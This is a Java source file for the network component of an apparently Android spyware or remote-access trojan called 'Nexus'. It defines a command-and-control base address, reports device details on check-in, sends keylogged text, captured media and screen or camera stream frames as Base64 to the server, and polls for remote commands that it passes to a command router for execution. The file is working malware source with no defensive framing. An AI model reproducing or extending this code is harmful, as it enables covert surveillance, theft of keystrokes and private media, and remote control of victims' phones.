package com.nexus.client;

import android.os.Build;
import android.util.Base64;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.IOException;
import okhttp3.*;

public class NetworkManager {
    private static final String C2_BASE = "http://10.0.2.2:5000"; // IP DO SEU SERVIDOR
    private static final OkHttpClient client = new OkHttpClient();
    public static final String DEVICE_ID = "NEXUS_" + Build.SERIAL;

    public static void checkIn() {
        JsonObject json = new JsonObject();
        json.addProperty("id", DEVICE_ID);
        json.addProperty("model", Build.MODEL);
        json.addProperty("android", Build.VERSION.RELEASE);
        json.addProperty("battery", "85%");
        post("/api/checkin", json.toString());
    }

    public static void sendKeylog(String app, String text) {
        JsonObject json = new JsonObject();
        json.addProperty("id", DEVICE_ID);
        json.addProperty("app", app);
        json.addProperty("text", text);
        post("/api/keylog", json.toString());
    }

    public static void sendMedia(byte[] data, String type) {
        JsonObject json = new JsonObject();
        json.addProperty("id", DEVICE_ID);
        json.addProperty("type", type);
        json.addProperty("file", Base64.encodeToString(data, Base64.NO_WRAP));
        post("/api/media", json.toString());
    }

    public static void sendStreamFrame(byte[] frame, String type) {
        JsonObject json = new JsonObject();
        json.addProperty("id", DEVICE_ID);
        json.addProperty("type", type);
        json.addProperty("frame", Base64.encodeToString(frame, Base64.NO_WRAP));
        post("/api/stream", json.toString());
    }

    public static void pollCommands() {
        Request request = new Request.Builder().url(C2_BASE + "/api/command/" + DEVICE_ID).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        JsonObject json = JsonParser.parseString(response.body().string()).getAsJsonObject();
                        if (json.has("command") && !json.get("command").isJsonNull()) {
                            String cmd = json.get("command").getAsString();
                            CommandRouter.execute(AppContext.getInstance(), cmd);
                        }
                    } catch (Exception e) {}
                    finally { response.close(); }
                }
            }
        });
    }

    private static void post(String endpoint, String jsonBody) {
        RequestBody body = RequestBody.create(jsonBody, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder().url(C2_BASE + endpoint).post(body).build();
        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {}
            @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
        });
    }
}